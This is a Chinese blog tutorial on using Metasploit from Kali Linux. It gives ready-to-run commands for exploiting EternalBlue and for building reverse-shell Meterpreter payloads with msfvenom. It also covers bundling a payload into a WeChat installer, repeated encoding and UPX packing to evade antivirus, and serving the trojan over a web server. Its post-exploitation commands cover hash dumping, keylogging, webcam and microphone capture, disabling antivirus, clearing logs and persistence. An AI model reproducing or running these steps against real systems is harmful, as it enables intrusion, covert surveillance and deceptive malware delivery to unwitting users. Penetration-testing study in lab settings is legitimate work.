---
title: Kali使用msf演示
abbrlink: 4cf34f0f
date: 2022-03-24 10:08:24
tags:
categories:
---

# 1 什么是MSF

Metasploit framework 简称msf，他是一个渗透测试平台，能够查找，利用和验证漏洞。

Metasploit是一个免费的，可下载的框架，通过它可以很容易的对计算机软件漏洞实施攻击。它本身是附带数百个已知软件漏洞的专业级漏洞攻击工具。是目前最流行、最强大、最具拓展性的渗透测试平台，一定程度上统一了渗透测试和漏洞研究的工作环境，使得新的攻击代码比较容易加入框架。<!--more-->

![img](https://cdn.jsdelivr.net/gh/qnjy/giteeimg/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png)

模块分为：

辅助模块--------------AUX(auxiliary module)

> 该模块不会直接在测试者和目标主机之间建立访问，他们只负责执行
>
> 扫描、嗅探、指纹识别等相关功能以辅助渗透测试

漏洞利用模块--------exploits

> 漏洞利用是指由渗透测试者利用一个系统、应用或者服务中的安全漏洞
> 进行的攻击行为。流行的渗透攻击技术包括缓冲区溢出、Web应用程序
> 攻击，以及利用配置错误等，其中包含攻击者或渗透测试人员针对系统
> 中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，
> 每个漏洞都有相应的攻击代码。

攻击载荷模块---------payloads

> 攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，
> 成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，
> 在Metasploit框架中可以自由地选择、传送和植入。攻击载荷也可能
> 是简单地在目标操作系统系统上执行一些命令，如添加用户账号等。

后渗透攻击模块------post

> 该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透
> 攻击动作，如获取敏感信息、实施跳板攻击等。

编码工具模块------------encoders

> 该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、
> IDS及类似的安全软件检测出。

空指令模块------------nops

# 2 MSF基本概念

## 2.1 功能模块

![image-20220403202025307](https://qnjy.coding.net/p/githubimg/d/githubimg/git/raw/master/img/20220415-20220403-image-20220403202025307.png)

MSF主目录为/usr/share/metasploit-framework/,其中包括了config配置文件、plugins插件、tools工具、db数据库文件、modules模块文件以及msfconsole、msfdb等命令，modules中的文件为我们最常用的模块文件，其中每个模块中都根据不同的操作系统，分为不同平台不同协议功能对应的漏洞利用文件，这些文件用ruby编写。

modules中的模块主要包括：

`exploits`:利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法，是一个流程性概念，其利用过程中可能用到payloads或shellcode等

`payloads`:成功exploit后，攻击过程中执行的代码或指令。可以是能够反弹shell的shellcode，也可以是直接在目标系统上直接执行的系统命令，默认有三类payloads，分别为：

* singles:要执行的所有代码都放在一个文件中，没有外部依赖，因此文件比较大，可能会因为攻击目标内存空间受限而无法使用
* stagers:传输一个较小的payload用于建立连接，后续再传输具体攻击payload(也就是stages)
* stages:利用stagers建立连接后，后续再传输的代码

`auxiliary`:没有payload的exploits模块，一般在信息收集阶段使用

`encoders`:对payloads进行加密，躲避AV检查的模块

## 2.2 基本命令

```shell
msfconsole   #启动MSF console界面
 
msfupdate    #msf版本更新
 
help/?       #打印当下窗口的帮助文档
 
help command/command --help #打印command命令的帮助文档
 
connect      #可以看成是msfconsole界面下的nc工具
 
edit         #编辑模块的ruby文件，与用vim编辑相同
 
show         #查看命令，可以看当前环境下的exploits、auxiliary、payloads等模块,其中Rank表示不同模块的评级（成功率和使用难易程度的重要参考），
 
             #最常使用的是`show options`命令，表示当前上下文环境中的选项内容,`show missing`可以查看当前有哪些必须的配置没有设置
 
show advanced   #一些不常用的高级选项，不会在`show options`中显示
 
search       #搜索关键词内容对应的模块，如搜索ms10_046漏洞模块：
（注意搜索出的内容所在基本目录为`/usr/share/metasploit-framework/modules/`）,除此之外search还可以添加一些筛选条件，如name、path、type等
 
info         #当前模块的基本信息
 
use          #使用不同的模块文件
 
set/unset    #设置变量/取消变量设置
 
setg/unsetg  #设置全局变量/取消全局变量设置，只会设置当前msf运行环境中的变量，退出msf后设置就复位
 
save         #将设置保存到/root/.msf4/config，msf启动时会读取该文件，这样重新启动msf后设置依然保留
 
back         #从模块上下文退回到msfconsole初始目录
 
run/exploit  #运行漏洞模块
 
sessions     #可以看见当前已经建立的攻击连接，利用`sessions -i id`命令进入指定连接
 
jobs         #查看后台运行的模块
 
load/unload  #连接插件，如load openvas，然后会出现相应的openvas命令，使用时需要用openvas_connect连接外部扫描器
 
loadpath     #调用自己编写的功能模块
 
route        #向session指定路由
 
resource     #调用rc文件的命令并执行，以方便直接取得session
```

## 2.3 数据库命令

**(1)数据库管理所用的命令为msfdb命令:**

```shell
msfdb init

msfdb reinit

msfdb delete

msfdb start

msfdb stop
```

**(2)在msfconsole中数据库管理命包括：**

```shell
db_connect

db_disconnect

db_status         #查看数据库状态，有无连接

db_nmap           #后续可以用hosts命令来查询扫描出的主机

db_rebuild_cache  #建立模块文件的缓存，使search搜索速度更快        

db_remove

db_export         #导出备份信息

db_import         #导入备份信息，备份为xml文件
```

其中db_namp在namp功能基础上，将搜索的数据存入数据库方便后续查询

## 2.3 MSF模块说明

### 2.3.1 Exploit模块

这个模块分为两类，Active exploit和Passive exploit，具体有如下区别：

**Active exploit**，攻击目标开放了某个端口服务，攻击者利用exploit传输payload，是攻击目标反弹shell或者建立连接连入攻击者，也就是说攻击者主动发起攻击，一般去分散成服务器端程序，最常用的。

*注：永恒之蓝ms17_010_eternalblue是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码，它影响的范围包括win7和sever 2008的所有版本系统。*

```shell
eg1: 永恒之蓝漏洞利用
usr auxiliary/scanner/smb/smb_ms17_010 #进行漏洞分析，看445端口能否被入侵
set rhosts 192.168.200.134
run #如果结果中出现`Host is likely VULNERABLE to MS17-010`，则说明主机很可能有永恒之蓝漏洞

use exploit/windows/smb/ms17_010_eternalblue
set payload windows/meterpreter/reverse_tcp
set RHOSTS 192.168.200.134
set lhosts 192.168.200.132
set lport 3333
run        #随后可以看到进入了meterpreter
```

**Passive exploit**，利用客户端程序的漏洞，客户端向存在exploit的服务端发送请求，返回的漏洞利用代码使得客户端可以反弹shell **(reverse_tcp)**或者反向建立连接**(bind_tcp)**连入攻击者，也就是说攻击者诱使攻击目标连接服务程序，通过返回的代码完成攻击，一般去攻击客户端程序。

### 2.3.2 Payload

> ​        Payload：Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意代码，而在Metasploit中Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。简而言之，这种漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为。
>   Shellcode：Shellcode是payload中的精髓部分，在渗透攻击时作为攻击载荷运行的一组机器指令。Shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令之后，才会提供一个命令行shell。

**Metasploit中的Payload模块主要分为以下三种类型：**

> ==Single==：
>   是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似netcat这样的非metasploit处理工具所捕捉到。
>
> ==Stager==：
>   这种Payload 负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stager Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条 tcp 连接，让目标系统主动连接我们的端口(反向连接)。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)。
>
> ==Stage==：
>   是Stager Payload下的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。

Stager中几种常见的payload：

```shell
windows/meterpreter/bind_tcp       #正向连接
windows/meterpreter/reverse_tcp    #反向连接，常用
windows/meterpreter/reverse_http   #通过监听80端口反向连接
windows/meterpreter/reverse_https  #通过监听443端口反向连接
```

==正向连接使用场景==：
  我们的攻击机在内网环境，目标机是外网环境，由于目标机无法主动连接到我们的主机，所以就必须我们主动连接目标机了。但是这里经常遇到的问题是，目标机上开了防火墙，只允许访问指定的端口，比如目标只对外开放了80端口。那么，我们就只能设置正向连接80端口了，这里很有可能失败，因为80端口上的流量太多了。

==反向连接使用场景==：
  我们的主机和目标机都是在外网或者都是在内网，这样目标机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使目标机开了防火墙也没事，防火墙只是阻止进入目标机的流量，而不会阻止目标机主动向外连接的流量。

==反向连接80和443端口使用场景==：
  目标机能主动连接到我们的主机，还有就是目标机的防火墙设置的特别严格，就连目标机访问外部网络的流量也进行了严格的限制，只允许目标机的80端口或443端口与外部通信。

# 3 ms17_010漏洞利用

> 永恒之蓝(Eternal Blue)爆发于2017年4月14日晚，是一种利用Vindows系统的SMB协议漏河来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。

## 3.1 基本命令

1. 在终端中输入`msfconsole`可以打开这个软件

   这里显示的是我们有多少个模块![image-20220324110431455](https://cdn.jsdelivr.net/gh/qnjy/giteeimg/img/20220324-image-20220324110431455.png)

2. 常用命令

   | 常用命令      | 作用                           |
   | ------------- | ------------------------------ |
   | connect IP    | 远程连接主机，一般用于内网渗透 |
   | show exploits | 列出框架中所有的攻击渗透模块   |
   | search \____  | 条件搜索                       |

   比如`search ms17_010`搜索这个漏洞

   *注：`ms17_010_netapi.rb`是微软漏洞的编号方式，不同标准有不同的编号方式。ms17_010漏洞，过Tcp端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只需要开机上网，攻击者就能在电脑和服务器中植入勒索软件*

   ![image-20220324203338674](https://cdn.jsdelivr.net/gh/qnjy/giteeimg/img/20220324-image-20220324203338674.png)

   rank是等级，按可靠性降序排列
   
   excellent-----great--good---normal---average---low---manual
   
   这里找到了5个模块，前三个是漏洞利用模块，后两个是辅助模块，主要探测主机是否存在MS17_010漏洞。

## 3.2 利用<font color="ff000">Auxiliary辅助探测模块</font>对漏洞进行探测

> `Auxiliary辅助探测模块`：
>    该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。

1. 使用smb_ms17_010漏洞探测模块对该漏洞进行探测：

   ```shell
   use auxiliary/scanner/smb/smb_ms17_010
   ```

   ![image-20220415092434366](https://qnjy.coding.net/p/githubimg/d/githubimg/git/raw/master/img/20220415-image-20220415092434366.png)

2. 查看这个模块需要配置的信息

   ```shell
   show options #查看这个模块需要的信息
   ```

   ![image-20220415092534473](https://qnjy.coding.net/p/githubimg/d/githubimg/git/raw/master/img/20220415-image-20220415092534473.png)

3. 设置要探测的远程目标：

   ```shell
   set rhosts 192.168.200.100-192.168.200.200
   ```

4. 对上面设置的ip范围内的主机进行攻击：

   ```
   exploit
   ```

   <font color="#ffa500">注：有+号的就是可能存在漏洞的主机，这里有1个主机存在漏洞</font>

   ![image-20220415093715179](https://qnjy.coding.net/p/githubimg/d/githubimg/git/raw/master/img/20220415-image-20220415093715179.png)

## 3.3 使用`Exploit漏洞利用模块`对漏洞进行利用

1. 选择漏洞攻击模块，对漏洞进行利用

   ```shell
   use exploit/windows/smb/ms17_010_eternalblue
   ```

   ![image-20220415094726165](https://qnjy.coding.net/p/githubimg/d/githubimg/git/raw/master/img/20220415-image-20220415094726165.png)

2. 可以查看这个漏洞的信息

   ```
   info
   ```

   可以查看攻击的系统平台，显示当前的攻击模块针对那些特定的操作系统。

   ```
   show targets
   ```

## 3.4 Payload攻击载荷模块

>   攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令。

1. 查看攻击载荷

   ```
   show  payloads  #该命令可以查看当前漏洞利用模块下可用的所有Payload
   ```

2. 设置攻击载荷

   ```
   set payload windows/x64/meterpreter/reverse_tcp
   ```

3. 查看模块需要配置的参数

   ```
   show  options
   ```

4. ```shell
   set RHOST 192.168.200.134   #设置RHOST，也就是目标主机的ip
   set LHOST 192.168.200.132   #设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell
   set lport 6666              #设置lport，也就是我们主机的端口，反弹shell到这个端口；如果我们这里不设置lport的话，默认是4444端口监听；
   ```

5. 进行攻击

   ```shell
   exploit -z -j     #-z 持续监听 -j 后台任务
   ```

# 4 reverse_tcp方式进行攻击

1. 命令：`msfvenom -p windows/meterpreter/reverse_tcp lhost=本机ip lport=本机端口号 -f exe -o 文件名.exe`

   > 设置lhost，即监听本机IP和lport监听端口，这里用的虚拟机测试，所以用的192.168.200.133，端口为1111，最后会通向192.168.200.133的1111端口

   ```shell
   #msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 lhost=攻击机IP lport=攻击机端口 -e 编码方式 -i编码次数 -f 输出格式 -o 输出文件
   
   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.200.128 lport=8888 -i 3 -e x86/shikata_ga_nai -f exe -o /var/www/html/shell.exe
   
   ```

   ![image-20220325120742191](https://cdn.jsdelivr.net/gh/qnjy/giteeimg/img/20220325-image-20220325120742191.png)

   > 大致参数介绍
   >
   > -l, --list <type> 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,......all
   >
   > -p, --payload < payload> 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的
   >
   > -f, --format < format> 指定输出格式
   >
   > -e, --encoder <encoder> 指定需要使用的encoder（编码器），指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload，x86/shikata_ga_nai 是 msf 自带的编码器，可以通过 -l encoders 查看所有编码器
   >
   > -a, --arch < architecture> 指定payload的目标架构，例如x86 还是 x64 还是 x86_64
   >
   > -o, --out < path> 指定创建好的payload的存放位置
   >
   > -b, --bad-chars < list> 设定规避字符集，指定需要过滤的坏字符。例如：不使用 '\x0f'、'\x00'
   >
   > -n, --nopsled < length> 为payload预先指定一个NOP滑动长度
   >
   > -s, --space < length> 设定有效攻击荷载的最大长度，就是文件大小
   >
   > -i, --iterations < count> 指定payload的编码次数
   >
   > -c, --add-code < path> 指定一个附加的win32 shellcode文件
   >
   > -x, --template < path> 指定一个自定义的可执行文件作为模板,并将payload嵌入其中
   >
   > -k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行
   >
   > -v, --var-name < value> 指定一个自定义的变量，以确定输出格式
   >
   > -t, --timeout <second> 从stdin读取有效负载时等待的秒数（默认为30，0表示禁用）
   >
   > -h,--help 查看帮助选项
   >
   > --platform < platform> 指定payload的目标平台

2. `msfconsole`打开msf

3. 配置参数

   (1)命令： `use exploit/multi/handler`（选择模块）

   (2)因为之前用的是reverse_tcp，所以设置如下：

   命令： `set payload windows/meterpreter/reverse_tcp`（选择攻击模块）

   (3)命令： `set lhost 192.168.200.132`（填写自己主机的IP地址）

   (4)命令： `set lport 1111`（填写刚才生成文件时的端口号）

   (5)命令： `show options`（查看设置参数）

   (6)命令： `exploit -z -j`（后台执行）

   ![image-20220325121212843](https://cdn.jsdelivr.net/gh/qnjy/giteeimg/img/20220325-image-20220325121212843.png)

4. 在靶机打开可执行文件

   这里可以把程序伪装一下，改一下图标，或者把它捆绑在某些软件上面，当用户打开就自动安装到对方电脑上

5. 查看用户

   (1)命令：sessions（查看上钩用户）

   (2)命令：sessions -i 1（选择需要攻击的用户，这里选1）

   ![image-20220325121313086](https://cdn.jsdelivr.net/gh/qnjy/giteeimg/img/20220325-image-20220325121313086.png)

   出现meterpreter就已经成功了

6. meterpreter入侵对方电脑的命令

   (1)监控对方电脑屏幕

   `run vnc -i`

   (2)更多命令

   > cmd指令:
   > cat 读取文件内容到屏幕
   > cd 更改目录
   > checksum 检索文件的校验和
   > cp 将源复制到目标
   > del 删除指定文件
   > dir 列出文件（ls 的别名）
   > 下载 下载文件或目录
   > 编辑 编辑文件
   > getlwd 打印本地工作目录
   > getwd 打印工作目录
   > lcd 更改本地工作目录
   > lls 列出本地文件
   > lpwd 打印本地工作目录
   > ls 列出文件
   > mkdir 创建目录
   > mv 将源移动到目标
   > pwd 打印工作目录
   > rm 删除指定文件
   > rmdir 删除目录
   > search 搜索文件
   > show_mount 列出所有挂载点/逻辑驱动器
   > upload 上传文件或目录
   > pkill 按名称终止进程

# 5 后渗透阶段

**METERPRETER：获取目标访问权限之后，Meterpreter用于后面的渗透测试。**

首先，我们输入： `shell`即可切换到目标主机的`windows cmd_shell`里面：

```shell
shell         #获取目标主机的cmd_shell权限
chcp 65001    #这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8
```

## 5.1 Post后渗透模块

```shell
run post/windows/manage/migrate                			#自动进程迁移
run post/windows/gather/checkvm                			#查看目标主机是否运行在虚拟机上
run post/windows/manage/killav                			#关闭杀毒软件
run post/windows/manage/enable_rdp            			#开启远程桌面服务
run post/windows/manage/autoroute              			#查看路由信息
run post/windows/gather/enum_logged_on_users    		#列举当前登录的用户
run post/windows/gather/enum_applications       		#列举应用程序
run post/windows/gather/credentials/windows_autologin 	#抓取自动登录的用户名和密码
run post/windows/gather/smart_hashdump               	#dump出所有用户的hash
```

## 5.2 权限提升

> 有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个 getsystem 命令，它可以使用多种技术在目标系统中实现提权。

```shell
getuid
#命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为  NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。
getsystem
#自动提权为系统权限
```

## 5.3 运行程序

先查看目标机上安装了那些应用：

```shell
run post/windows/gather/enum_applications  #查看目标主机安装了哪些应用
```

在meterpreter_shell命令行执行目标系统中的应用程序：

```shell
#execute命令用法：
execute [参数] -f 指定的可执行文件

-f：指定可执行文件
-H：创建一个隐藏进程
-a：传递给命令的参数
-i：跟进程进行交互
-m：从内存中执行
-t：使用当前伪造的线程令牌运行进程
-s：在给定会话中执行进程
```

## 5.4 屏幕截图

截图目标主机屏幕，可以看到，图片被保存到了`/root/桌面/`目录下：

```shell
screenshot #截图目标主机屏幕
```

## 5.5 键盘记录

Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：

```shell
keyscan_start： #开启键盘记录功能，开关键盘记录功能后目标输入的内容我们就通过keyscan_dump命令在Meterpreter里面进行查看；
keyscan_dump：  #显示捕捉到的键盘记录信息
keyscan_stop：  #停止键盘记录功能
```

需要进行进程迁移

![在这里插入图片描述](https://qnjy.coding.net/p/githubimg/d/githubimg/git/raw/master/img/20220424-20210427160410905.png)

![](https://qnjy.coding.net/p/githubimg/d/githubimg/git/raw/master/img/20220424-20210427160438172.png)

使用以下模块

```shell
run post/windows/capture/keylog_recorder
```

## 5.6 禁止目标使用键盘鼠标

```shell
uictl  disable(enable) keyboard  #禁止(允许)目标使用键盘
uictl  disable(enable) mouse     #禁止(允许)目标使用鼠标
```

## 5.7 用目标主机摄像头拍照

```shell
webcam_list    #获取目标系统的摄像头列表
webcam_snap    #从指定的摄像头，拍摄照片
webcam_stream  #从指定的摄像头，开启视频
```

## 5.8 生成持续性后门

>   因为meterpreter 是基于内存DLL建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机。

有两种方法：

* 启动项启动（persistence）
* 服务启动（metsvc）

## ······

# 6 补充

## 6.1 MSFCLI

msfcli是metasploit提供的一种命令行接口，在使用时一句命令完成所有动作，由`msdconsole -x进入`，使用cli接口的目的主要是编写脚本时便于引用，如：

```shell
msfconsole -x 'use exploit/windows/smb/ms08_067+netapi;
set RHOST 1.1.1.1;set PAYLOAD windows/meterpreter/reverse_tcp;
set LHOST 1.1.1.6;set LPORT 5555;set target 34;exploit'
```

## 6.2 meterpreter常用命令

> keyscan_start 开始捕获击键（开始键盘记录）
> keyscan_dump 转储按键缓冲（下载键盘记录）
> keyscan_stop 停止捕获击键（停止键盘记录）
> record_mic X秒从默认的麦克风record_mic音频记录（音频录制）
> webcam_chat 开始视频聊天（视频，对方会有弹窗）
> webcam_list 单摄像头（查看摄像头列表）
> webcam_snap 采取快照从指定的摄像头（摄像头拍摄一张照片）
> webcam_stream 播放视频流从指定的摄像头（开启摄像头监控）
> enumdesktops 列出所有可访问的桌面和窗口站（窗体列表）
> getdesktop 得到当前的Meterpreter桌面
> reboot 重新启动远程计算机
> shutdown 关闭远程计算机
> shell 放入系统命令 shell
> enumdesktops 列出所有可访问的桌面和窗口站
> getdesktop 获取当前的meterpreter桌面
> idletime 返回远程用户空闲的秒数
> keyboard_send 发送击键
> keyevent 发送按键事件
> keyscan_dump 转储击键缓冲区
> keyscan_start 开始捕获击键
> keyscan_stop 停止捕获击键
> mouse 发送鼠标事件
> screenshare 实时观看远程用户桌面
> screenshot 抓取交互式桌面的屏幕截图
> setdesktop 更改 Meterpreters 当前桌面
> uictl 控制一些用户界面组件
> record_mic 从默认麦克风录制音频 X 秒
> webcam_chat 开始视频聊天
> webcam_list 列出网络摄像头
> webcam_snap 从指定的网络摄像头拍摄快照
> webcam_stream 播放来自指定网络摄像头的视频流
> play 在目标系统上播放波形音频文件 (.wav)
> getsystem 尝试将您的权限提升到本地系统的权限
> execute -f notepad 打开记事本

```shell
Meterpreter > ?
==========================================
核心命令：
==========================================
命令                           说明
-------                       ------------
?                             帮助菜单
background                    把当前会话挂到后台运行
bg                            background命令的别名
bgkill                        杀死后台meterpreter 脚本
bglist                        列出正在运行的后台脚本
bgrun                         执行一个meterpreter脚本作为后台线程
channel                       显示信息或控制活动频道
close                         关闭一个频道
detach                        分离Meterpreter会话（用于 http/https）
disable_unicode_encoding      禁用 unicode 字符串的编码
enable_unicode_encoding       启用 unicode 字符串的编码
exit                          终止 Meterpreter 会话
get_timeouts                  获取当前会话超时值
guid                          获取会话 GUID
help                          帮助菜单
info                          显示有关 Post 模块的信息
irb                           在当前会话中打开一个交互式 Ruby shell
load                          加载一个或多个 Meterpreter 扩展
machine_id                    获取连接到会话的机器的 MSF ID
migrate                       将服务器迁移到另一个进程
pivot                         管理枢轴侦听器
pry                           在当前会话上打开 Pry 调试器
quit                          终止 Meterpreter 会话
read                          从通道读取数据
resource                      运行存储在文件中的命令
run                           执行一个 Meterpreter 脚本或 Post 模块
secure                       （重新）协商会话上的 TLV 数据包加密
sessions                      快速切换到另一个会话
set_timeouts                  设置当前会话超时值
sleep                         强制 Meterpreter 安静，然后重新建立会话
ssl_verify                    修改 SSL 证书验证设置
transport                     管理运输机制
use                           不推荐使用的load命令别名
uuid                          获取当前会话的 UUID
write                         将数据写入通道

==========================================
Stdapi：文件系统命令
==========================================

命令                           说明
-------                       ------------
cat                           将文件内容读到屏幕上
cd                            切换目录
checksum                      检索文件的校验和
cp                            将源复制到目标
del                           删除指定文件
dir                           列出文件（ls 的别名）
download                      下载文件或目录
edit                          编辑文件
getlwd                        打印本地工作目录
getwd                         打印工作目录
lcd                           更改本地工作目录
lls                           列出本地文件
lpwd                          打印本地工作目录
ls                            列出文件
mkdir                         制作目录
mv                            将源移动到目标
pwd                           打印工作目录
rm                            删除指定文件
rmdir                         删除目录
search                        搜索文件
show_mount                    列出所有挂载点/逻辑驱动器
upload                        上传文件或目录

==========================================
Stdapi：网络命令
==========================================
命令                           说明
-------                       ------------
arp                           显示主机 ARP 缓存
getproxy                      显示当前代理配置
ifconfig                      显示界面
ipconfig                      显示接口
netstat                       显示网络连接
portfwd                       将本地端口转发到远程服务
resolve                       解析目标上的一组主机名
route                         查看和修改路由表

==========================================
Stdapi：系统命令
==========================================
命令                           说明
-------                       ------------
clearev                       清除事件日志
drop_token                    放弃任何活动的模拟令牌。
execute                       执行命令
getenv                        获取一个或多个环境变量值
getpid                        获取当前进程标识符
getprivs                      尝试启用当前进程可用的所有权限
getid                         获取服务器运行的用户的 SID
getuid                        获取服务器运行的用户
kill                          终止进程
localtime                     显示目标系统本地日期和时间
pgrep                         按名称过滤进程
pkill                         按名称终止进程
ps                            列出正在运行的进程
reboot                        重启远程计算机
reg                           修改远程注册表并与之交互
rev2self                      在远程机器上调用 RevertToSelf()
shell                         放入系统命令 shell
shutdown                      关闭远程计算机
steal_token                   尝试从目标进程窃取模拟令牌
suspend                       暂停或恢复进程列表
sysinfo                       获取有关远程系统的信息，例如 OS

==========================================
Stdapi：用户界面命令
==========================================
命令                           说明
-------                       ------------
enumdesktops                  列出所有可访问的桌面和窗口站
getdesktop                    获取当前的meterpreter桌面
idletime                      返回远程用户空闲的秒数
keyboard_send                 发送击键
keyevent                      发送按键事件
keyscan_dump                  转储击键缓冲区
keyscan_start                 开始捕获击键
keyscan_stop                  停止捕获击键
mouse                         发送鼠标事件
screenshare                   实时观看远程用户桌面
screenshot                    抓取交互式桌面的截图
setdesktop                    更改meterpreters当前桌面
uictl                         控制一些用户界面组件

==========================================
Stdapi：网络摄像头命令：
==========================================
命令                           说明
-------                       ------------
record_mic                    从默认麦克风录制音频 X 秒
webcam_chat                   开始视频聊天
webcam_list                   列出网络摄像头
webcam_snap                   从指定的网络摄像头拍摄快照
webcam_stream                 从指定的网络摄像头播放视频流

==========================================
Stdapi：音频输出命令：
==========================================
命令                           说明
-------                       ------------
play                          在目标系统上播放波形音频文件 (.wav)

==========================================
Priv：权限提升命令：
==========================================
命令                           说明
-------                       ------------
getsystem                     尝试将您的权限提升到本地系统的权限。

==========================================
Priv：密码数据库命令：
==========================================
命令                           说明
-------                       ------------
hashdump                      转储 SAM 数据库的内容

==========================================
Priv：Timestomp 命令：
==========================================
命令                           说明
-------                       ------------
timestomp                     操作文件 MACE 属性

meterpreter >
```

## 6.3 木马的免杀后门

1. ```shell
   msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 lhost=攻击机IP lport=攻击机端口 -e 编码方式 -i编码次数 -f 输出格式 -o 输出文件
   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.200.128 lport=8888 -i 3 -e x86/shikata_ga_nai -f exe -o /var/www/html/shell.exe
   ```

2. 在kali上启动apache为靶机提供后门程序下载

   ```
   systemctl start apache2
   ```

3. 多次打包并捆绑在软件上

   ```shell
   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.200.128 LPORT=8888 -e x86/shikata_ga_nai -x /var/www/html/WeChatSetup.exe -i 12 -f exe -o /var/www/html//WeChatSetup1.exe
   ```
   
3. kali启动监听

   ```shell
   msfconsole
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST 192.168.200.128
   set LPORT 8888
   run
   ```

   
   
3. upx加壳

   upx打包器有两种功能，一种叫做给程序加壳，一种叫压缩程序，在这里使用打包器的目的是改变后门程序的特征码。
   
   压缩的时候：它首先可执行文件中的可执行数据解压出来，然后将解压缩用的代码附加在前面
   
   运行的时候：将原本的可执行数据解压出来，然后再运行解压缩后的数据
   
   * kali内置upx打包器
   
     ```shell
     #最简单的是直接使用upx file命令
     upx ____
     ```
   
     
   
   
   
   https://blog.csdn.net/qq_42052733/article/details/117251056

# 7 总结

## 7.1 msf渗透的基本步骤

```shell
msfconsole										    #进入框架
search  ms17_010                                    # 使用search命令查找相关漏洞
use exploit/windows/smb/ms17_010_eternalblue        # 使用use进入模块
info     										    #使用info查看模块信息
set payload windows/x64/meterpreter/reverse_tcp    	#设置攻击载荷
show options    									#查看模块需要配置的参数
set  RHOST  192.168.100.158    					    #设置参数
exploit / run     								    #攻击
后渗透阶段											#后渗透阶段
M
```

  **不同的攻击用到的步骤也不一样，这不是一成不变的，需要灵活使用。**
